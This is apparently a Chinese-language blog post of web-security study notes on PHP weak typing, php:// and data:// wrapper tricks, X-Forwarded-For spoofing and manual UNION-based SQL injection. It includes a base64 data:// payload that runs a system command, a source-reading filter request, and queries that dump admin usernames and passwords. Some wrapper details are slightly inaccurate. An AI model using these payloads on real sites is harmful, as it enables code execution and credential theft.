---
layout: post
title: "WEB SEC(ing)"
categories: [websec]

---

### PHP弱类型

#### 1.比较操作符
=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较。

== 在进行比较的时候，会先将字符串类型转化成相同，再比较。


```
在$a==$b的比较中

$a=' ';$b=null  //true

$a=null;$b=true //true

$a=0;$b='0' //true

$a=0;$b='abcdef ' //true  而0===’abcdef’ false

```

#### 2.Hash比较缺陷

```
"0e132456789"=="0e7124511451155" //true
"0e123456abc"=="0e1dddada" //false
"0e1abc"=="0" //true
```

### 伪协议

#### 1.php伪协议
用法  

php://input,用于执行php代码，需要post请求提交数据。
php://filter,用于读取源码，get提交参数。
```
?a=php://filter/read=convert.base64/resource=xxx.php
```

需要开启
```
allow_url_fopen:php://input、
php://stdin、php://memory、php://temp
```

不需要开启
```
allow_url_fopen:php://filter
```


#### 2.data协议

用法：

```
data://text/plain,xxxx(要执行的php代码)
data://text/plain;base64,xxxx(base64编码后的数据)
```

例：

```
?page=data://text/plain,
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4=
```


#### 3.file协议
用法：
file://[本地文件系统的绝对路径]


### 可变变量
一种特殊变量，允许动态改变一个变量名称。工作原理是该变量的名称由另外一个变量的名称确定，实现过程就是在变量的前面多加一个美元符号 “$”。

例子

```
<?php

$change_name = "trans";
$trans = "this is me";
echo $change_name;
echo $$change_name;

?>

//输出trans this is me
```


### XFF
XFF头(X-Forwarded-For)，代表客户端，也就是HTTP的请求端真实的IP。有两种方式可以从HTTP请求中获得请求者的IP地址。一个是从Remote Address中获得，另一个是从X-Forward-For中获得，但他们的安全性和使用场景各有不同。一旦用错，就可能为系统造成漏洞。  

Remote Address代表的是当前HTTP请求的远程地址，即HTTP请求的源地址。HTTP协议在三次握手时使用的就是这个Remote Address地址，在发送响应报文时也是使用这个Remote Address地址。因此，如果请求者伪造Remote Address地址，他将无法收到HTTP的响应报文，此时伪造没有任何意义。这也就使得Remote Address默认具有防篡改的功能。  

在一些大型网站中，来自用户的HTTP请求会经过反向代理服务器的转发，此时，服务器收到的Remote Address地址就是反向代理服务器的地址。在这样的情况下，用户的真实IP地址将被丢失，因此有了HTTP扩展头部X-Forward-For。当反向代理服务器转发用户的HTTP请求时，需要将用户的真实IP地址写入到X-Forward-For中，以便后端服务能够使用。由于X-Forward-For是可修改的，所以X-Forward-For中的地址在某种程度上不可信。  

所以，在进行与安全有关的操作时，只能通过Remote Address获取用户的IP地址，不能相信任何请求头。
当然，在使用nginx等反向代理服务器的时候，是必须使用X-Forward-For来获取用户IP地址的（此时Remote Address是nginx的地址），因为此时X-Forward-For中的地址是由nginx写入的，而nginx是可信任的。不过此时要注意，要禁止web对外提供服务。


### sql

#### union select手工注入

mysql中的information_schema 结构用来存储数据库系统信息 
information_schema 结构中这几个表存储的信息，在注射中可以用到的几个表。　 
 
SCHEMATA 存储数据库名的， 
关键字段：SCHEMA_NAME，表示数据库名称 
TABLES 存储表名的 
关键字段：TABLE_SCHEMA表示表所属的数据库名称； 
TABLE_NAME表示表的名称 
COLUMNS 存储字段名的 
关键字段：TABLE_SCHEMA表示表所属的数据库名称； 
TABLE_NAME表示所属的表的名称 
COLUMN_NAME表示字段名 
 
 
爆所有数据名 

```
select group_concat(SCHEMA_NAME) from information_schema.schemata
```

得到当前库的所有表 

```
select group_concat(table_name) from information_schema.tables where table_schema=database()
```

得到表中的字段名 将敏感的表进行16进制编码adminuser=0x61646D696E75736572 

```
select group_concat(column_name) from information_schema.columns where table_name=0x61646D696E75736572
```

得到字段具体的值     
```
select group_concat(username,0x3a,password) from adminuser
```
